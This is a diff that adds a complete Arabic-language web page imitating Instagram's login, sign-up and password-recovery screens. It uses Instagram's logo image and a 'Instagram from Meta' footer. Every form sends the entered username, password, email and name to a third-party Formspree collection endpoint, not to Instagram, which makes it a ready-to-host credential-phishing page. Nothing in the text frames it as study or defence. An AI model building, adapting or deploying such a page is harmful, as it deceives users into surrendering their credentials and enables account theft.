@@ -1,0 +1,182 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>dephamza — دخول / تسجيل / استرجاع</title>
+
+  <!-- خطوط -->
+  <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg:#050505;
+      --card-bg:#0b0b0b;
+      --border:rgba(255,255,255,0.06);
+      --muted:rgba(255,255,255,0.6);
+      --input-bg:rgba(255,255,255,0.03);
+      --blue:#3346d6;
+      --blue-hover:#2b3ec3;
+    }
+
+    *{box-sizing:border-box}
+    html,body{
+      height:100%;
+      margin:0;
+      background:var(--bg);
+      color:#fff;
+      font-family:"Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+    }
+
+    .page{
+      min-height:100%;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:24px;
+    }
+
+    .card{
+      width:360px;
+      background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0));
+      border:1px solid var(--border);
+      padding:28px;
+      border-radius:10px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.35), 0 0 0 1px rgba(0,0,0,0.2) inset;
+    }
+
+    .brand{
+      font-family:"Pacifico", cursive;
+      font-size:44px;
+      text-align:center;
+      margin:6px 0 18px 0;
+      color:#fff;
+      letter-spacing:0.6px;
+    }
+
+    form{display:flex; flex-direction:column; gap:12px;}
+
+    .input{
+      background:var(--input-bg);
+      border:1px solid rgba(255,255,255,0.08);
+      padding:10px 12px;
+      border-radius:8px;
+      color:#fff;
+      outline:none;
+      font-size:14px;
+    }
+    .input::placeholder{ color: rgba(255,255,255,0.6); }
+
+    .btn{
+      margin-top:6px;
+      background:linear-gradient(180deg,var(--blue),var(--blue-hover));
+      color:#fff;
+      border:none;
+      padding:10px 14px;
+      border-radius:10px;
+      cursor:pointer;
+      font-weight:600;
+      font-size:15px;
+    }
+    .btn:active{ transform:translateY(1px); }
+
+    .meta{
+      margin-top:8px;
+      color:var(--muted);
+      font-size:13px;
+      text-align:center;
+    }
+
+    .link{
+      color:#2aa0ff;
+      cursor:pointer;
+      text-decoration:none;
+    }
+    .link:hover{ text-decoration:underline; }
+
+    footer{
+      position:fixed;
+      left:0; right:0; bottom:18px;
+      display:flex;
+      justify-content:center;
+      gap:18px;
+      color:rgba(255,255,255,0.55);
+      font-size:13px;
+      flex-wrap:wrap;
+      pointer-events:none;
+    }
+    footer a{ color:rgba(255,255,255,0.55); text-decoration:none; pointer-events:auto; }
+    footer a:hover{ color:#ffffff; text-decoration:underline; }
+
+    @media (max-width:520px){
+      .card{ width:94%; }
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <div class="card" role="main" aria-labelledby="brand">
+      <div id="brand" class="brand"><i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png&quot;); background-position: 0px -2907px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i></div>
+
+      <!-- فورم تسجيل الدخول -->
+      <form id="loginForm" action="https://formspree.io/f/mldwepvp" method="POST">
+        <input class="input" type="text" name="username"
+          placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
+        <input class="input" type="password" name="password"
+          placeholder="كلمة السر" required>
+        <button class="btn" type="submit">تسجيل الدخول</button>
+        <div class="meta">
+          <span class="link" onclick="showForm('forgot')">نسيت كلمة السر؟</span> |
+          <span class="link" onclick="showForm('signup')">إنشاء حساب جديد</span>
+        </div>
+      </form>
+
+      <!-- فورم إنشاء حساب -->
+      <form id="signupForm" style="display:none" action="https://formspree.io/f/mldwepvp" method="POST">
+        <input class="input" type="text" name="fullname" placeholder="الاسم الكامل" required>
+        <input class="input" type="email" name="email" placeholder="البريد الإلكتروني" required>
+        <input class="input" type="password" name="password" placeholder="كلمة السر" required>
+        <input class="input" type="password" name="confirm" placeholder="تأكيد كلمة السر" required>
+        <button class="btn" type="submit">إنشاء حساب</button>
+        <div class="meta">
+          عندك حساب؟ <span class="link" onclick="showForm('login')">سجّل الدخول</span>
+        </div>
+      </form>
+
+      <!-- فورم استرجاع كلمة المرور -->
+      <form id="forgotForm" style="display:none" action="https://formspree.io/f/mldwepvp" method="POST">
+        <input class="input" type="email" name="resetEmail" placeholder="أدخل بريدك الإلكتروني" required>
+        <button class="btn" type="submit">إرسال رابط الاسترجاع</button>
+        <div class="meta">
+          <span class="link" onclick="showForm('login')">الرجوع إلى تسجيل الدخول</span>
+        </div>
+      </form>
+
+    </div>
+  </div>
+
+  <footer>
+    <a href="#">حول</a>
+    <a href="#">المدوّنة</a>
+    <a href="#">المساعدة</a>
+    <a href="#">الشروط</a>
+    <a href="#">الخصوصية</a>
+    <a href="#">Threads</a>
+    <span>l © 2025    Instagram from Meta  </span>
+  </footer>
+
+  <script>
+    function showForm(name){
+      document.getElementById("loginForm").style.display = "none";
+      document.getElementById("signupForm").style.display = "none";
+      document.getElementById("forgotForm").style.display = "none";
+
+      if(name === "login") document.getElementById("loginForm").style.display = "flex";
+      if(name === "signup") document.getElementById("signupForm").style.display = "flex";
+      if(name === "forgot") document.getElementById("forgotForm").style.display = "flex";
+    }
+  </script>
+</body>
+</html>
